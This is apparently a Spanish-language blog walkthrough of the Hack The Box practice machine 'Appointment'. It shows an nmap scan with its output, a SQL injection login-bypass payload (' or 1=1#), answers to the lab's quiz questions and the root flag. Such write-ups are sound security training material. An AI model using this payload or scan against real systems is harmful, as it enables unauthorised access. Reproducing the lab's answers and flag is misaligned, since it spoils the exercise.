---
title: HTB - Appointment
date: 2022-06-21
categories: [Hack The Box, Starting Point]
tag: [Web, Sql, Starting Point - Tier 2]
img_path: /assets/img/htb/appointment
image:
   path: appointment.png
   width: 371
   height: 168
---
<h2 style="color:#74b4f4">Escaneo</h2>
---
Realizamos un escaneo de `nmap` para identificar los puertos abiertos y servicios.

```console
nmap {target ip} -sV -v -O
```

Resultado del escaneo:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 20:09 CDT
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 20:09
Scanning 10.129.8.143 [4 ports]
Completed Ping Scan at 20:09, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:09
Completed Parallel DNS resolution of 1 host. at 20:09, 0.00s elapsed
Initiating SYN Stealth Scan at 20:09
Scanning 10.129.8.143 [1000 ports]
Discovered open port 80/tcp on 10.129.8.143
Completed SYN Stealth Scan at 20:09, 2.96s elapsed (1000 total ports)
Initiating Service scan at 20:09
Scanning 1 service on 10.129.8.143
Completed Service scan at 20:09, 6.35s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.129.8.143
Retrying OS detection (try #2) against 10.129.8.143
Retrying OS detection (try #3) against 10.129.8.143
Retrying OS detection (try #4) against 10.129.8.143
Retrying OS detection (try #5) against 10.129.8.143
NSE: Script scanning 10.129.8.143.
Initiating NSE at 20:09
Completed NSE at 20:10, 1.49s elapsed
Initiating NSE at 20:10
Completed NSE at 20:10, 1.56s elapsed
Nmap scan report for 10.129.8.143
Host is up (0.40s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/26%OT=80%CT=1%CU=37959%PV=Y%DS=2%DC=I%G=Y%TM=626897E
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST1
OS:1NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 47.250 days (since Thu Mar 10 13:10:18 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.88 seconds
           Raw packets sent: 1220 (57.946KB) | Rcvd: 1164 (52.452KB)
```

Podemos observar que existe un servidor Apache corriendo en el puerto 80 lo que quiere decir que hay una página web activa en esa máquina. 

![](Pasted image 20220426203317.png)

![](Pasted image 20220426203252.png)

Intentamos una <b style="color:#800000">SQL Injection</b> básica para acceder al sistema como administrador sin necesidad de una contraseña.

```sql
' or 1=1#
```

Obtenemos la bandera.

![](Pasted image 20220426203049.png)

<h2 style="color:#74b4f4">Preguntas</h2>
---
1. ¿Qué significa el acrónimo SQL?

	<b style="color:#8B2F97">Structured Query Language</b>
	
2. ¿Cuál es uno de los tipos más comunes de vulnerabilidades de SQL?

	<b style="color:#8B2F97">SQL Injection</b>
	
3. ¿Qué significa PII?

	<b style="color:#8B2F97">Personally Identifiable Information</b>
	
4. ¿Cuál es el nombre de la lista OWASP Top 10 para la clasificación de esta vulnerabilidad?

	<b style="color:#8B2F97">A03:2021-Injection</b>

5. ¿Qué servicio y versión se ejecutan en el puerto 80 del destino?

	<b style="color:#8B2F97">Apache httpd 2.4.38 ((Debian))</b>

6. ¿Cuál es el puerto estándar utilizado para el protocolo HTTPS?

	<b style="color:#8B2F97">443</b>

7. ¿Cuál es un método basado en la suerte para explotar las páginas de inicio de sesión?

	<b style="color:#8B2F97">Brute-Forcing</b>

8. ¿Cómo se llama una carpeta en la terminología de aplicaciones web?

	<b style="color:#8B2F97">Directory</b>

9. ¿Qué código de respuesta se da para los errores "No encontrado"?

	<b style="color:#8B2F97">404</b>

10. ¿Qué interruptor usamos con Gobuster para especificar que buscamos descubrir directorios y no subdominios?

	<b style="color:#8B2F97">dir</b>

11. ¿Qué símbolo usamos para comentar partes del código?

	<b style="color:#8B2F97">#</b>
	
**Root Flag:** <b style="color:#FF8B00">e3d0796d002a446c0e622226f42e9672</b>


![](Pasted image 20220426203857.png)
